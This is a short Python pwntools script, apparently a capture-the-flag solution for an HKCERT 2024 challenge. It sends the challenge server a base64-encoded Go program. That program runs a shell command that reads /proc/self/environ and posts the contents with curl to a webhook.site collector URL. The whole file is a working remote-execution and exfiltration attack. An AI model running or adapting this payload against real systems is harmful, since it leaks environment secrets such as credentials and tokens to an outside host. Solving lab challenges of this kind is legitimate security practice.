from pwn import remote
import base64

r = remote("c03-get-flag-yourself.hkcert24.pwnable.hk", 1337, ssl=True)

payload = base64.b64encode(b"""package main
import ("os/exec")
func main() {
    cmd := exec.Command("sh", "-c", "(cat /proc/self/environ)| curl -X POST -d @- https://webhook.site/683e9467-acfc-4575-a3b3-58d0c065df8e")
    cmd.Run()
}
""")

r.sendlineafter(b">> ", payload)

r.interactive()